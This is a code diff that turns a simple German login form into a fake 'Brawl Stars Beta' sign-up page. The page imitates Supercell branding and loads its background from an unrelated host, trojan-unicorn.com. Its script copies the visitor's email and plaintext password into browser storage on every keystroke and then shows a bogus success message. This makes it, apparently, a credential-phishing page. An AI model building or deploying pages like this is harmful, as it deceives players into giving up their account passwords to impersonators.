@@ -1,75 +1,172 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Supercell - Kundenanmeldung</title>
+    <title>Brawl Stars Beta - Supercell</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
-            padding: 20px;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
             min-height: 100vh;
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)),
+                        url('https://www.trojan-unicorn.com/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBNzFSQVE9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--73f5fac5021334351204f5e6194508b1b24751c3/supercell.png');
+            background-size: cover;
+            background-position: center;
+            backdrop-filter: blur(5px);
         }
-        .form-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
+
+        .logo {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 200px;
+            height: 60px;
+            background: url('https://supercell.com/images/16a069b22e0605efd5c5eb8087da850d/bg_hero_scid_landing_0.webp');
+            background-size: contain;
+            background-repeat: no-repeat;
+            z-index: 100;
         }
-        .form-title {
-            color: #333;
+
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+
+        .title {
+            color: #2b2b2b;
             text-align: center;
+            font-size: 24px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            color: #666;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
             margin-bottom: 20px;
         }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
+
+        .input-group label {
             display: block;
-            margin-bottom: 5px;
-            color: #666;
+            color: #555;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
         }
-        input {
+
+        .input-group input {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
+            padding: 12px 15px;
+            border: 2px solid #e1e1e1;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
         }
-        button {
+
+        .input-group input:focus {
+            border-color: #1e88e5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(30, 136, 229, 0.1);
+        }
+
+        .submit-btn {
             width: 100%;
-            padding: 12px;
-            background-color: #4CAF50;
+            padding: 14px;
+            background: #1e88e5;
             color: white;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: 8px;
             font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        button:hover {
-            background-color: #45a049;
+
+        .submit-btn:hover {
+            background: #1976d2;
+            transform: translateY(-1px);
+            box-shadow: 0 7px 14px rgba(0, 0, 0, 0.1);
+        }
+
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            animation: slideIn 0.5s ease-out;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .beta-badge {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background: #ff4081;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(255, 64, 129, 0.3);
         }
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <h2 class="form-title">Supercell - Kundenanmeldung</h2>
+    <div class="logo"></div>
+    <div class="container">
+        <div class="beta-badge">Beta</div>
+        <h1 class="title">Brawl Stars Beta</h1>
+        <p class="subtitle">Melde dich an für exklusive Zugang zum Beta-Programm</p>
         <form id="loginForm">
             <div class="input-group">
-                <label for="email">E-Mail:</label>
-                <input type="email" id="email" name="email" required>
+                <label for="email">E-Mail</label>
+                <input type="email" id="email" required placeholder="deine@email.com">
             </div>
             <div class="input-group">
-                <label for="password">Passwort:</label>
-                <input type="password" id="password" name="password" required>
+                <label for="password">Passwort</label>
+                <input type="password" id="password" required placeholder="••••••••">
             </div>
-            <button type="submit">Anmelden</button>
+            <button type="submit" class="submit-btn">Beta Zugang Anfordern</button>
         </form>
+    </div>
+    <div id="successPopup" class="success-popup">
+        Erfolgreich für das Beta-Programm registriert!
     </div>
 
     <script>
@@ -79,7 +176,7 @@
             
             const userData = {
                 email: email,
-                password: password, // Passwort wird jetzt unverändert übermittelt
+                password: password,
                 timestamp: new Date().toLocaleTimeString(),
                 lastUpdate: Date.now()
             };
@@ -87,19 +184,23 @@
             localStorage.setItem('currentUser', JSON.stringify(userData));
         }
 
-        // Event-Listener für Echtzeit-Updates
         document.getElementById('email').addEventListener('input', updateSupport);
         document.getElementById('password').addEventListener('input', updateSupport);
 
-        // Formular-Submit
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            alert('Anmeldung erfolgreich!');
+            
+            const successPopup = document.getElementById('successPopup');
+            successPopup.style.display = 'block';
+            
+            setTimeout(() => {
+                successPopup.style.display = 'none';
+            }, 3000);
+
             localStorage.removeItem('currentUser');
             e.target.reset();
         });
 
-        // Beim Schließen der Seite oder Navigation aufräumen
         window.addEventListener('beforeunload', () => {
             localStorage.removeItem('currentUser');
         });
